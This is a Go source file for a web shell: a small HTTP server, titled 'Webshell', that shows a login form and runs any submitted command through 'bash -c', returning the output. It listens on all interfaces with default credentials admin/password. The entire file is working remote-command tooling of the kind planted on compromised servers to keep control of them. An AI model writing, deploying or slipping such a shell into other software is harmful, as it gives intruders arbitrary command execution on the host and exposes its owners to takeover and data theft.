package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"os/exec"
)

func authenticate(r *http.Request, username, password string) bool {
	return r.FormValue("username") == username && r.FormValue("password") == password
}

func indexHandler(w http.ResponseWriter, r *http.Request, username, password string) {
	if r.Method == "POST" {
		if authenticate(r, username, password) {
			command := r.FormValue("command")
			cmd := exec.Command("bash", "-c", command)
			output, err := cmd.CombinedOutput()
			if err != nil {
				fmt.Fprintf(w, "Error: %s\n", err)
				return
			}
			w.Header().Set("Content-Type", "text/plain") // 设置响应头
			fmt.Fprintf(w, "%s", output)
		} else {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
		}
	} else {
		w.Header().Set("Content-Type", "text/html") // 设置响应头
		fmt.Fprintf(w, `
		<html>
		<head><title>Webshell</title></head>
		<body>
			<form method="post">
				<label for="username">Username:</label><br>
				<input type="text" id="username" name="username"><br>
				<label for="password">Password:</label><br>
				<input type="password" id="password" name="password"><br>
				<label for="command">Enter command:</label><br>
				<input type="text" id="command" name="command"><br>
				<input type="submit" value="Submit">
			</form>
		</body>
		</html>
		`)
	}
}

func main() {
	var (
		username string
		password string
		host     string
		port     string
	)

	flag.StringVar(&username, "u", "admin", "Username for authentication")
	flag.StringVar(&password, "pw", "password", "Password for authentication")
	flag.StringVar(&host, "host", "0.0.0.0", "Host ip to run the server on")
	flag.StringVar(&port, "port", "8080", "Port to run the server on")

	flag.Parse()

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		indexHandler(w, r, username, password)
	})

	log.Printf("Server running on %s:%s...\n", host, port)
	log.Fatal(http.ListenAndServe(host+":"+port, nil))
}
